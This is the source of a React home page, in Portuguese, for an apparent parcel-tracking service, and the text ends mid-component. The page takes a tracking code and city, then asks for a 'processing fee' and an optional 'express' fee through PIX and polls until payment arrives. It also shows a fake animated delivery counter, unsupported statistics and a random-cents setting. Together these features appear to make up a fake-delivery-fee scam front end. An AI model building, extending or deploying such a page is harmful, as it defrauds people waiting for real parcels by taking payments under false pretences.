import React, { useState, useEffect } from 'react';
import { Search, Zap, ArrowRight, Globe, QrCode, Satellite, Package, Warehouse, GitBranch, RotateCcw, Smile, Star, Clock, TrendingUp, Calculator, MapPinned, Truck, CheckCircle, HelpCircle, Info } from 'lucide-react';
import { Link } from 'react-router-dom';
import Header from '../components/Header';
import Footer from '../components/Footer';

const API_BASE = import.meta.env.VITE_API_URL || '';

const Home: React.FC = () => {
    const [codigo, setCodigo] = useState('');
    const [cidade, setCidade] = useState('');
    const [loading, setLoading] = useState(false);
    const [trackResult, setTrackResult] = useState<any>(null);
    const [trackError, setTrackError] = useState('');
    const [activeTab, setActiveTab] = useState<'voce' | 'empresas'>('voce');
    const [heroCounter, setHeroCounter] = useState(0);
    const [showExpressModal, setShowExpressModal] = useState(false);

    // PixGhost Integration State
    const [pixLoading, setPixLoading] = useState(false);
    const [pixData, setPixData] = useState<any>(null);
    const [pixPaid, setPixPaid] = useState(false);

    // Tax Modal State
    const [showTaxModal, setShowTaxModal] = useState(false);
    const [taxPixLoading, setTaxPixLoading] = useState(false);
    const [taxPixData, setTaxPixData] = useState<any>(null);
    const [taxPixPaid, setTaxPixPaid] = useState(false);

    // Polling de pagamento PIX (Taxa)
    useEffect(() => {
        let interval: any;
        if (showTaxModal && taxPixData && !taxPixPaid) {
            interval = setInterval(async () => {
                try {
                    const res = await fetch(`${API_BASE}/api/pix/status/${taxPixData.id || taxPixData.payment_id}?codigo=${trackResult?.codigo || ''}`);
                    const data = await res.json();

                    if (data.success && (data.status === 'PAID' || data.status === 'CONFIRMED' || data.data?.status === 'PAID' || data.data?.status === 'completed')) {
                        setTaxPixPaid(true);
                        clearInterval(interval);
                        // Atualizar dados do rastreio após 2 segundos para mostrar a nova etapa
                        setTimeout(() => {
                            if ((window as any).handleTrackGlobal) (window as any).handleTrackGlobal();
                        }, 2000);
                    }
                } catch (e) {
                    console.error('Erro ao verificar status do PIX:', e);
                }
            }, 5000);
        }
        return () => clearInterval(interval);
    }, [showTaxModal, taxPixData, taxPixPaid, trackResult?.codigo]);

    // Polling de pagamento PIX (Acelerar/Express)
    useEffect(() => {
        let interval: any;
        if (showExpressModal && pixData && !pixPaid) {
            interval = setInterval(async () => {
                try {
                    const res = await fetch(`${API_BASE}/api/pix/status/${pixData.id || pixData.payment_id}?codigo=${trackResult?.codigo || ''}`);
                    const json = await res.json();
                    if (json && json.success && (json.status === 'PAID' || json.status === 'CONFIRMED' || json.data?.status === 'PAID' || json.data?.status === 'completed')) {
                        setPixPaid(true);
                        clearInterval(interval);
                        setTimeout(() => {
                            if ((window as any).handleTrackGlobal) (window as any).handleTrackGlobal();
                        }, 2000);
                    }
                } catch (e) { }
            }, 5000);
        }
        return () => clearInterval(interval);
    }, [showExpressModal, pixData, pixPaid, trackResult?.codigo]);

    // Config State
    const [useRandomCents, setUseRandomCents] = useState(true);

    useEffect(() => {
        fetch(`${API_BASE}/api/config/centavos`)
            .then(res => res.json())
            .then(data => setUseRandomCents(data.active))
            .catch(() => setUseRandomCents(true));
    }, []);

    // Observer para Animação de Entrada
    useEffect(() => {
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('reveal-active');
                }
            });
        }, { threshold: 0.1 });

        document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
        return () => observer.disconnect();
    }, [activeTab]);

    // Contador animado
    useEffect(() => {
        const target = 10247;
        const duration = 2000;
        const steps = 60;
        const increment = target / steps;
        let current = 0;
        const timer = setInterval(() => {
            current += increment;
            if (current >= target) { setHeroCounter(target); clearInterval(timer); }
            else setHeroCounter(Math.floor(current));
        }, duration / steps);
        return () => clearInterval(timer);
    }, []);

    const handleTrack = async (e?: React.FormEvent) => {
        if (e) e.preventDefault();
        setLoading(true);
        setTrackError('');
        try {
            const res = await fetch(`${API_BASE}/api/rastreio-publico`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ codigo, cidade })
            });
            const data = await res.json();
            if (data.success) {
                setTrackResult(data);
            } else {
                setTrackError(data.message || 'Código não encontrado.');
            }
        } catch (err) {
            setTrackError('Erro na conexão. Tente novamente.');
        } finally {
            setLoading(false);
        }
    };

    // Expor handleTrack globalmente para os useEffects acima
    useEffect(() => {
        (window as any).handleTrackGlobal = handleTrack;
    }, [handleTrack]);

    const formatDate = (dateStr: string) => {
        const d = new Date(dateStr);
        return d.toLocaleDateString('pt-BR') + ' ' + d.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
    };

    const getStatusIcon = (status: string) => {
        const s = status.toLowerCase();
        if (s.includes('saiu') || s.includes('entrega') || s.includes('rota')) return <Truck size={32} color="#0055ff" />;
        if (s.includes('trânsito') || s.includes('transito')) return <Package size={32} color="#3b82f6" />;
        if (s.includes('postado') || s.includes('coletado')) return <Warehouse size={32} color="#06b6d4" />;
        if (s.includes('entregue')) return <CheckCircle size={32} color="#10b981" />;
        return <MapPinned size={32} color="#0055ff" />;
    };

    return (
        <div className="home-page">
            <style>{`
                .home-page {
                    background: var(--bg-primary);
                    color: var(--text-primary);
                    min-height: 100vh;
                    position: relative;
                    overflow-x: hidden;
                }
                .home-page * { box-sizing: border-box; }

                .bg-mesh {
                    position: fixed; inset: 0; pointer-events: none; z-index: 0;
                    background:
                        radial-gradient(ellipse 80% 50% at 50% -20%, rgba(0, 85, 255, 0.06), transparent),
                        radial-gradient(ellipse 60% 40% at 80% 50%, rgba(59, 130, 246, 0.04), transparent),
                        radial-gradient(ellipse 50% 30% at 20% 80%, rgba(6, 182, 212, 0.03), transparent);
                }
                .bg-grid {
                    position: fixed; inset: 0; pointer-events: none; z-index: 0;
                    background-image: linear-gradient(rgba(0,85,255,0.03) 1px, transparent 1px),
                                      linear-gradient(90deg, rgba(0,85,255,0.03) 1px, transparent 1px);
                    background-size: 60px 60px;
                    mask-image: radial-gradient(ellipse 70% 60% at 50% 0%, black 40%, transparent 100%);
                }

                .reveal { opacity: 0; transform: translateY(30px) scale(0.95); transition: all 0.8s cubic-bezier(0.16, 1, 0.3, 1); }
                .reveal-active { opacity: 1; transform: translateY(0) scale(1); }
                .reveal-delay-1 { transition-delay: 0.1s; }
                .reveal-delay-2 { transition-delay: 0.2s; }
                .reveal-delay-3 { transition-delay: 0.3s; }

                .hero-section {
                    position: relative; z-index: 1;
                    padding: 120px 24px 60px;
                    max-width: 880px; margin: 0 auto;
                    text-align: center;
                }

                .hero-left { min-width: 0; }
                .hero-glass-card {
                    padding: 48px 40px; border-radius: 28px;
                    background: rgba(255, 255, 255, 0.65);
                    backdrop-filter: blur(28px) saturate(1.5);
                    border: 1px solid rgba(255,255,255,0.8);
                    box-shadow: 0 20px 60px rgba(0,40,120,0.08), inset 0 1px 0 rgba(255,255,255,0.9);
                    position: relative; overflow: hidden;
                    transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
                }
                .hero-glass-card:hover {
                    box-shadow: 0 30px 80px rgba(0,40,120,0.1), inset 0 1px 0 rgba(255,255,255,0.95);
                    transform: translateY(-4px);
                }
                .hero-glass-card::before {
                    content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
                    background: linear-gradient(90deg, #0055ff, #3b82f6, #06b6d4, #0055ff);
                    background-size: 200% 100%;
                    animation: gradient-flow 3s ease infinite;
                }
                @keyframes gradient-flow { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
                .hero-right { 
                    display: flex; justify-content: center; gap: 20px; margin-top: 32px;
                    flex-wrap: wrap;
                }
                .hero-badge {
                    display: inline-flex; align-items: center; gap: 8px;
                    padding: 8px 16px 8px 10px;
                    background: rgba(0, 85, 255, 0.06);
                    border: 1px solid rgba(0, 85, 255, 0.12);
                    border-radius: 100px;
                    font-size: 0.8rem; font-weight: 600;
                    color: #0055ff;
                    margin-bottom: 24px;
                    animation: fadeIn 0.5s ease;
                }
                .hero-badge-dot {
                    width: 8px; height: 8px; border-radius: 50%;
                    background: #0055ff;
                    box-shadow: 0 0 10px rgba(0, 85, 255, 0.5);
                    animation: pulse-dot 2s ease infinite;
                }
                @keyframes pulse-dot {
                    0%, 100% { opacity: 1; transform: scale(1); }
                    50% { opacity: 0.5; transform: scale(1.5); }
                }
                .hero-title {
                    font-size: clamp(2.2rem, 5.5vw, 4rem);
                    font-weight: 900; line-height: 1.08;
                    letter-spacing: -2px; margin-bottom: 20px;
                    font-family: 'Outfit', sans-serif;
                    color: var(--text-primary);
                }
                .hero-title .gradient-word {
                    background: linear-gradient(135deg, #0055ff, #3b82f6, #06b6d4);
                    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
                    background-clip: text;
                }
                .hero-desc {
                    color: var(--text-secondary);
                    font-size: clamp(0.95rem, 2vw, 1.1rem);
                    line-height: 1.7; margin-bottom: 32px; max-width: 520px;
                }
                .hero-actions { display: flex; gap: 12px; margin-bottom: 48px; flex-wrap: wrap; }
                .cta-primary {
                    display: inline-flex; align-items: center; gap: 10px;
                    padding: 16px 32px;
                    background: linear-gradient(135deg, #0055ff, #3b82f6);
                    border-radius: 14px; color: white; text-decoration: none;
                    font-weight: 700; font-size: 0.95rem;
                    box-shadow: 0 8px 24px rgba(0, 85, 255, 0.3);
                    transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
                    position: relative; overflow: hidden;
                    white-space: nowrap; justify-content: center;
                }
                .cta-primary::after {
                    content: ''; position: absolute; top: 0; left: -100%;
                    width: 100%; height: 100%;
                    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
                    transition: left 0.6s;
                }
                .cta-primary:hover::after { left: 100%; }
                .cta-primary:hover { transform: translateY(-3px); box-shadow: 0 16px 40px rgba(0, 85, 255, 0.4); color: white; }
                .cta-secondary {
                    display: inline-flex; align-items: center; gap: 8px;
                    padding: 16px 28px;
                    border: 1px solid rgba(0,85,255,0.12); border-radius: 14px;
                    color: var(--text-primary); text-decoration: none; font-weight: 600; font-size: 0.95rem;
                    background: rgba(255,255,255,0.5);
                    backdrop-filter: blur(12px);
                    transition: all 0.3s;
                    white-space: nowrap; justify-content: center;
                }
                .cta-secondary:hover { background: rgba(255,255,255,0.8); border-color: rgba(0,85,255,0.2); color: var(--text-primary); }

                .track-form { max-width: 500px; margin: 0 auto; }
                .track-fields { display: flex; flex-direction: column; gap: 10px; margin-bottom: 12px; }
                .track-input-wrap {
                    display: flex; align-items: center; gap: 12px;
                    background: rgba(255,255,255,0.7);
                    border: 1px solid rgba(0,85,255,0.08);
                    border-radius: 14px; padding: 4px 16px;
                    transition: all 0.3s;
                }
                .track-input-wrap:focus-within {
                    border-color: rgba(0, 85, 255, 0.4);
                    box-shadow: 0 0 0 3px rgba(0, 85, 255, 0.1);
                    background: #fff;
                }
                .track-input {
                    flex: 1; background: transparent; border: none; color: var(--text-primary);
                    padding: 14px 0; font-size: 0.95rem; outline: none; font-family: 'Inter', sans-serif;
                }
                .track-input::placeholder { color: var(--text-muted); }
                .track-submit {
                    width: 100%; padding: 16px; border: none; border-radius: 14px;
                    background: linear-gradient(135deg, #0055ff, #3b82f6);
                    color: white; font-weight: 700; font-size: 1rem; cursor: pointer;
                    font-family: 'Outfit', sans-serif;
                    box-shadow: 0 8px 24px rgba(0, 85, 255, 0.25);
                    transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
                    position: relative; overflow: hidden;
                }
                .track-submit::after {
                    content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
                    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
                    transition: left 0.6s;
                }
                .track-submit:hover::after { left: 100%; }
                .track-submit:hover { transform: translateY(-3px); box-shadow: 0 16px 40px rgba(0, 85, 255, 0.4); }
                .track-submit:active { transform: translateY(0); transition-duration: 0.1s; }
                .track-submit:disabled { opacity: 0.7; cursor: not-allowed; }

                .float-card {
                    padding: 28px 32px; border-radius: 24px;
                    background: rgba(255,255,255,0.65);
                    backdrop-filter: blur(24px) saturate(1.4);
                    border: 1px solid rgba(255,255,255,0.8);
                    text-align: center; min-width: 220px;
                    transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
                    box-shadow: 0 12px 40px rgba(0,40,120,0.06);
                    transform-style: preserve-3d;
                    cursor: default;
                }
                .float-card:hover {
                    border-color: rgba(0, 85, 255, 0.25);
                    transform: translateY(-8px) rotateX(2deg) rotateY(-1deg) !important;
                    box-shadow: 0 24px 56px rgba(0,40,120,0.12);
                }
                .float-card-value {
                    font-size: 2.8rem; font-weight: 900;
                    font-family: 'Outfit', sans-serif;
                    background: linear-gradient(135deg, #0055ff, #3b82f6);
                    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
                    background-clip: text;
                }
                .float-card-label { color: var(--text-secondary); font-size: 0.85rem; margin-top: 6px; }

                .result-area {
                    position: relative; z-index: 1;
                    max-width: 800px; margin: 0 auto; padding: 0 24px 60px;
                }
                .error-card {
                    padding: 48px; border-radius: 28px; text-align: center;
                    background: rgba(255,255,255,0.6);
                    backdrop-filter: blur(20px);
                    border: 1px solid rgba(239, 68, 68, 0.15);
                }
                .result-card {
                    padding: 32px; border-radius: 28px;
                    background: rgba(255,255,255,0.6);
                    backdrop-filter: blur(20px);
                    border: 1px solid rgba(255,255,255,0.8);
                    box-shadow: 0 16px 48px rgba(0,40,120,0.06);
                }
                .status-header {
                    display: flex; align-items: center; gap: 20px;
                    padding: 24px; margin-bottom: 24px;
                    background: rgba(0, 85, 255, 0.04);
                    border-radius: 20px; border: 1px solid rgba(0, 85, 255, 0.08);
                }
                .status-icon-box {
                    width: 64px; height: 64px; border-radius: 20px;
                    background: rgba(0, 85, 255, 0.06);
                    display: flex; align-items: center; justify-content: center; flex-shrink: 0;
                }
                .tl-item { display: flex; gap: 20px; }
                .tl-marker { display: flex; flex-direction: column; align-items: center; width: 20px; flex-shrink: 0; }
                .tl-dot {
                    width: 14px; height: 14px; border-radius: 50%;
                    border: 2px solid rgba(0,85,255,0.1); flex-shrink: 0; z-index: 2;
                }
                .tl-line { width: 2px; flex: 1; background: rgba(0,85,255,0.06); min-height: 40px; }
                .tl-content { flex: 1; padding: 14px 18px; border-radius: 14px; margin-bottom: 10px; }
                .express-box { text-align: center; padding: 24px 0 0; margin-top: 20px; border-top: 2px dashed rgba(0,85,255,0.08); }
                .express-btn {
                    padding: 16px 32px; border: none; border-radius: 16px;
                    background: linear-gradient(135deg, #0055ff, #3b82f6);
                    color: white; font-weight: 800; font-size: 1rem; cursor: pointer;
                    box-shadow: 0 8px 24px rgba(0, 85, 255, 0.25);
                    font-family: 'Outfit', sans-serif; transition: all 0.3s;
                }
                .express-btn:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(0, 85, 255, 0.4); }

                .tabs-wrap {
                    position: relative; z-index: 1;
                    max-width: 1280px; margin: 0 auto; padding: 30px 24px 0;
                }
                .tabs-bar {
                    display: inline-flex; gap: 4px; padding: 4px;
                    background: rgba(255,255,255,0.5);
                    border-radius: 16px; border: 1px solid rgba(255,255,255,0.7);
                    backdrop-filter: blur(12px);
                }
                .tab-btn {
                    padding: 12px 28px; background: transparent; border: none;
                    color: var(--text-secondary); cursor: pointer;
                    border-radius: 12px; font-weight: 600; font-size: 0.9rem;
                    font-family: 'Outfit', sans-serif; transition: all 0.3s;
                }
                .tab-btn:hover { color: var(--text-primary); }
                .tab-btn.active {
                    background: linear-gradient(135deg, #0055ff, #3b82f6);
                    color: white; font-weight: 700;
                    box-shadow: 0 4px 16px rgba(0, 85, 255, 0.3);
                }

                .content-section {
                    position: relative; z-index: 1;
                    padding: 60px 24px 80px;
                    max-width: 1280px; margin: 0 auto;
                    animation: fadeIn 0.6s ease;
                }
                .section-header { margin-bottom: 48px; }
                .section-label {
                    display: inline-flex; align-items: center; gap: 8px;
                    padding: 6px 14px;
                    background: rgba(0, 85, 255, 0.06);
                    border: 1px solid rgba(0, 85, 255, 0.1);
                    border-radius: 100px;
                    font-size: 0.78rem; font-weight: 600; color: #0055ff;
                    margin-bottom: 16px; text-transform: uppercase; letter-spacing: 0.05em;
                }
                .section-title {
                    font-size: clamp(1.8rem, 4vw, 2.8rem);
                    font-weight: 900; letter-spacing: -1px;
                    font-family: 'Outfit', sans-serif; line-height: 1.15;
                    color: var(--text-primary);
                }
                .section-title .gradient-word {
                    background: linear-gradient(135deg, #0055ff, #3b82f6, #06b6d4);
                    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
                    background-clip: text;
                }
                .section-subtitle {
                    color: var(--text-secondary);
                    font-size: 1.05rem; margin-top: 12px; max-width: 500px;
                }

                .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
                .feature-card {
                    padding: 32px; border-radius: 24px;
                    background: rgba(255,255,255,0.55);
                    backdrop-filter: blur(20px) saturate(1.3);
                    border: 1px solid rgba(255,255,255,0.7);
                    display: flex; flex-direction: column; gap: 16px;
                    transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
                    transform-style: preserve-3d;
                    box-shadow: 0 4px 16px rgba(0,40,120,0.04);
                    position: relative; overflow: hidden;
                }
                .feature-card::after {
                    content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
                    background: var(--accent-gradient); transform: scaleX(0);
                    transition: transform 0.5s cubic-bezier(0.16, 1, 0.3, 1); transform-origin: left;
                }
                .feature-card:hover {
                    background: rgba(255,255,255,0.82);
                    border-color: rgba(0, 85, 255, 0.2);
                    transform: translateY(-10px) rotateX(2deg) scale(1.01);
                    box-shadow: 0 30px 60px rgba(0,40,120,0.1), 0 0 0 1px rgba(0, 85, 255, 0.08);
                }
                .feature-card:hover::after { transform: scaleX(1); }
                .feature-icon {
                    width: 56px; height: 56px; border-radius: 16px;
                    display: flex; align-items: center; justify-content: center;
                }
                .feature-card h3 { font-size: 1.15rem; font-weight: 700; color: var(--text-primary); }
                .feature-card p { color: var(--text-secondary); line-height: 1.6; font-size: 0.9rem; flex: 1; }
                .feature-link {
                    color: #0055ff; text-decoration: none; font-weight: 700; font-size: 0.85rem;
                    display: flex; align-items: center; gap: 6px; transition: gap 0.3s;
                }
                .feature-link:hover { gap: 10px; color: #3b82f6; }

                .metrics-bar {
                    position: relative; z-index: 1;
                    padding: 40px 24px;
                    max-width: 1280px; margin: 0 auto;
                    display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px;
                }
                .metric-card {
                    padding: 32px 20px; border-radius: 24px; text-align: center;
                    background: rgba(255,255,255,0.6);
                    backdrop-filter: blur(20px) saturate(1.3);
                    border: 1px solid rgba(255,255,255,0.7);
                    transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
                    box-shadow: 0 4px 16px rgba(0,40,120,0.04);
                    transform-style: preserve-3d;
                }
                .metric-card:hover {
                    border-color: rgba(0, 85, 255, 0.25);
                    transform: translateY(-6px) rotateX(1deg);
                    box-shadow: 0 24px 48px rgba(0,40,120,0.1);
                    background: rgba(255,255,255,0.82);
                }
                .metric-icon {
                    width: 48px; height: 48px; border-radius: 14px;
                    display: flex; align-items: center; justify-content: center;
                    margin: 0 auto 12px;
                }
                .metric-value {
                    font-size: 2rem; font-weight: 900;
                    font-family: 'Outfit', sans-serif;
                    background: linear-gradient(135deg, #0055ff, #3b82f6);
                    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
                    background-clip: text;
                }
                .metric-label { color: var(--text-secondary); font-size: 0.85rem; margin-top: 4px; }

                .testimonials-section {
                    position: relative; z-index: 1;
                    padding: 100px 24px;
                    background: linear-gradient(180deg, transparent, rgba(0, 85, 255, 0.02), transparent);
                    border-top: 1px solid rgba(0,85,255,0.04);
                    border-bottom: 1px solid rgba(0,85,255,0.04);
                }
                .testimonials-inner { max-width: 1280px; margin: 0 auto; }
                .testimonial-card {
                    padding: 32px; border-radius: 24px;
                    background: rgba(255,255,255,0.55);
                    backdrop-filter: blur(16px);
                    border: 1px solid rgba(255,255,255,0.7);
                    display: flex; flex-direction: column; gap: 16px;
                    transition: all 0.4s;
                    box-shadow: 0 4px 16px rgba(0,40,120,0.04);
                }
                .testimonial-card:hover {
                    border-color: rgba(0, 85, 255, 0.15);
                    transform: translateY(-4px);
                }
                .testimonial-stars { display: flex; gap: 3px; }
                .testimonial-text { color: var(--text-secondary); line-height: 1.7; font-size: 0.95rem; font-style: italic; flex: 1; }

                @keyframes fadeIn {
                    from { opacity: 0; transform: translateY(20px); }
                    to { opacity: 1; transform: translateY(0); }
                }
                @keyframes float {
                    0%, 100% { transform: translateY(0) rotate(-2deg); }
                    50% { transform: translateY(-12px) rotate(-1deg); }
                }
                @keyframes float2 {
                    0%, 100% { transform: translateY(0) rotate(2deg); }
                    50% { transform: translateY(-8px) rotate(3deg); }
                }

                @media (max-width: 1024px) {
                    .hero-section { flex-direction: column; gap: 40px; }
                    .hero-right { flex-direction: row; justify-content: center; }
                    .grid-3 { grid-template-columns: repeat(2, 1fr); }
                    .metrics-bar { grid-template-columns: repeat(2, 1fr); }
                }
                @media (max-width: 768px) {
                    .status-card { padding: 20px; }
                    .search-box-premium { border-radius: 20px; flex-direction: column; padding: 15px; gap: 15px; }
                    .search-input-premium { text-align: center; font-size: 1.1rem; padding: 10px; }
                    .btn-track { width: 100%; padding: 15px; justify-content: center; }
                    .desktop-nav { display: none !important; }
                    .mobile-toggle { display: flex !important; }
                    .hero-section { padding-top: 140px !important; }
                    .status-header { flex-direction: column; text-align: center; gap: 20px; align-items: center !important; }
                    .status-icon-box { margin: 0 auto; width: 64px; height: 64px; }
                    .status-header h3 { flex-direction: column !important; gap: 10px !important; font-size: 1.25rem !important; }
                    .tax-badge { font-size: 0.65rem !important; padding: 4px 10px !important; }
                    .hero-title { letter-spacing: -1px; font-size: 2.2rem !important; margin-top: 20px; }
                    .hero-desc { font-size: 0.95rem !important; }
                    .hero-glass-card { padding: 32px 20px; }
                    .hero-right { display: flex !important; gap: 12px; margin-top: 20px; }
                    .track-form-grid { grid-template-columns: 1fr; }
                    .track-input-wrap { padding: 12px; }
                    .track-submit { width: 100%; padding: 18px; }
                    .result-card { padding: 20px; }
                    .tax-box { flex-direction: column; text-align: center; }
                    .tax-btn { width: 100%; margin-top: 10px; }
                    .grid-3 { grid-template-columns: 1fr; }
                    .metrics-bar { grid-template-columns: repeat(2, 1fr); gap: 12px; padding: 20px 16px; }
                    .metric-card { padding: 24px 16px; }
                    .metric-value { font-size: 1.6rem; }
                    .tabs-wrap { padding: 20px 16px 0; }
                    .content-section { padding: 40px 16px 60px; }
                    .metrics-bar { grid-template-columns: 1fr 1fr; }
                    .header-inner { padding: 12px 16px; }
                }

                .instruction-card {
                    background: #ffffff;
                    border: 1px solid #0055ff;
                    border-radius: 24px;
                    padding: 32px;
                    margin-top: 40px;
                    text-align: left;
                    box-shadow: 0 8px 32px rgba(0, 40, 120, 0.1);
                }
                .instruction-step {
                    display: flex;
                    gap: 16px;
                    margin-bottom: 20px;
                }
                .step-num {
                    width: 32px; height: 32px;
                    background: #0055ff;
                    color: white;
                    border-radius: 50%;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    font-weight: 900;
                    flex-shrink: 0;
                    box-shadow: 0 4px 12px rgba(0, 85, 255, 0.3);
                }
                .faq-grid {
                    display: grid;
                    grid-template-columns: repeat(2, 1fr);
                    gap: 20px;
                    margin-top: 32px;
                    text-align: left;
                }
                .faq-card {
                    background: rgba(255, 255, 255, 0.6) !important;
                    backdrop-filter: blur(12px);
                    border: 1px solid rgba(255, 255, 255, 0.8) !important;
                    border-radius: 20px;
                    padding: 24px !important;
                    display: flex;
                    align-items: flex-start;
                    gap: 16px;
                    transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
                    box-shadow: 0 4px 20px rgba(0, 40, 120, 0.04) !important;
                }
                .faq-card:hover {
                    background: rgba(255, 255, 255, 0.9) !important;
                    transform: translateY(-4px);
                    box-shadow: 0 12px 32px rgba(0, 40, 120, 0.08) !important;
                    border-color: rgba(0, 85, 255, 0.2) !important;
                }
                .faq-icon-box {
                    width: 44px; height: 44px;
                    background: rgba(0, 85, 255, 0.08);
                    border-radius: 12px;
                    display: flex; align-items: center; justify-content: center;
                    flex-shrink: 0;
                }
                @media (max-width: 600px) {
                    .faq-grid { grid-template-columns: 1fr; }
                }
            `}</style>


            <div className="bg-mesh"></div>
            <div className="bg-grid"></div>

            <Header />

            {/* ===== HERO ===== */}
            <section className="hero-section">
                <div className="hero-left" style={{ animation: 'fadeIn 0.7s ease' }}>
                    <div className="hero-glass-card">
                        <div className="hero-badge">
                            <div className="hero-badge-dot"></div>
                            🚀 {heroCounter.toLocaleString('pt-BR')}+ entregas hoje
                        </div>

                        <h1 className="hero-title">
                            Sua encomenda,<br />nossa <span className="gradient-word">tecnologia.</span>
                        </h1>

                        <p className="hero-desc">
                            Rastreie, envie e gerencie seus pacotes em tempo real. A maior malha logística do Brasil com frete grátis para todo o país.
                        </p>

                        <div className="hero-actions">
                            <Link to="/pedido" className="cta-primary">
                                <Package size={18} /> Enviar agora
                            </Link>
                            <Link to="/pedido" className="cta-secondary">
                                <Calculator size={18} /> Calcular frete
                            </Link>
                        </div>

                        {/* Formulário de Rastreio */}
                        <form onSubmit={handleTrack} className="track-form">
                            <div className="track-fields">
                                <div className="track-input-wrap">
                                    <Search size={16} color="#0055ff" />
                                    <input className="track-input" placeholder="Código de rastreio" value={codigo} onChange={e => setCodigo(e.target.value.toUpperCase())} maxLength={30} required />
                                </div>
                                <div className="track-input-wrap">
                                    <MapPinned size={16} color="#0055ff" />
                                    <input className="track-input" placeholder="Sua cidade" value={cidade} onChange={e => setCidade(e.target.value)} required />
                                </div>
                            </div>
                            <button type="submit" className="track-submit" disabled={loading}>
                                {loading ? '⏳ Buscando...' : '🔍 Rastrear agora'}
                            </button>
                        </form>

                        {/* Adicionado: Instruções e FAQ na Home */}
                        {!trackResult && (
                            <div className="reveal reveal-delay-2">
                                <div className="instruction-card">
                                    <h3 style={{ fontSize: '1.25rem', fontWeight: 900, marginBottom: '24px', color: 'var(--text-primary)', display: 'flex', alignItems: 'center', gap: '10px' }}>
                                        <Package size={22} color="#0055ff" /> Como rastrear sua encomenda
                                    </h3>
                                    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(180px, 1fr))', gap: '20px' }}>
                                        <div className="instruction-step">
                                            <div className="step-num">1</div>
                                            <div style={{ fontSize: '0.85rem' }}>
                                                <div style={{ fontWeight: 800 }}>Pegue seu código</div>
                                                <div style={{ color: 'var(--text-secondary)' }}>No seu e-mail ou SMS.</div>
                                            </div>
                                        </div>
                                        <div className="instruction-step">
                                            <div className="step-num">2</div>
                                            <div style={{ fontSize: '0.85rem' }}>
                                                <div style={{ fontWeight: 800 }}>Insira o código</div>
                                                <div style={{ color: 'var(--text-secondary)' }}>No campo de busca acima.</div>
                                            </div>
                                        </div>
                                        <div className="instruction-step">
                                            <div className="step-num">3</div>
                                            <div style={{ fontSize: '0.85rem' }}>
                                                <div style={{ fontWeight: 800 }}>Sua cidade</div>
                                                <div style={{ color: 'var(--text-secondary)' }}>Para sua segurança.</div>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <div className="faq-grid">
                                    <div className="faq-card">
                                        <div className="faq-icon-box">
                                            <HelpCircle size={22} color="#0055ff" />
                                        </div>
                                        <div>
                                            <div style={{ color: '#0055ff', fontWeight: 900, fontSize: '0.98rem', marginBottom: '4px', fontFamily: 'Outfit, sans-serif' }}>Onde encontrar meu código?</div>
                                            <div style={{ fontSize: '0.88rem', color: '#475569', fontWeight: 500, lineHeight: 1.6 }}>Enviado pela loja via E-mail após a postagem.</div>
                                        </div>
                                    </div>
                                    <div className="faq-card">
                                        <div className="faq-icon-box">
                                            <Info size={22} color="#0055ff" />
                                        </div>
                                        <div>
                                            <div style={{ color: '#0055ff', fontWeight: 900, fontSize: '0.98rem', marginBottom: '4px', fontFamily: 'Outfit, sans-serif' }}>O que é Taxa de Processamento?</div>
                                            <div style={{ fontSize: '0.88rem', color: '#475569', fontWeight: 500, lineHeight: 1.6 }}>Tributos necessários para a liberação de entrega.</div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        )}
                    </div>{/* fim hero-glass-card */}
                </div>

                <div className="hero-right">
                    <div className="float-card" style={{ animation: 'float 5s ease-in-out infinite', transform: 'rotate(-2deg)' }}>
                        <div className="float-card-value">+100M</div>
                        <div className="float-card-label">Objetos Entregues</div>
                    </div>
                    <div className="float-card" style={{ animation: 'float2 6s ease-in-out infinite', transform: 'rotate(2deg)' }}>
                        <div className="float-card-value">4.8★</div>
                        <div className="float-card-label">Satisfação dos Clientes</div>
                    </div>
                </div>
            </section>

            {/* ===== RESULTADO ===== */}
            {trackError && (
                <div className="result-area" style={{ animation: 'fadeIn 0.5s ease' }}>
                    <div className="error-card">
                        <span style={{ fontSize: '3rem' }}>❌</span>
                        <h3 style={{ color: '#ff6b6b', marginTop: '16px', fontSize: '1.2rem' }}>{trackError}</h3>
                    </div>
                </div>
            )}
            {trackResult && (
                <div className="result-area" style={{ animation: 'fadeIn 0.5s ease' }}>
                    <div className="result-card">
                        {trackResult.taxa_valor && (
                            <div style={{
                                background: 'rgba(239, 68, 68, 0.15)',
                                border: '1px solid rgba(239, 68, 68, 0.4)',
                                borderRadius: '24px',
                                padding: '24px',
                                marginBottom: '32px',
                                display: 'flex',
                                alignItems: 'center',
                                justifyContent: 'space-between',
                                gap: '16px',
                                boxShadow: '0 8px 32px rgba(239, 68, 68, 0.15)'
                            }}>
                                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
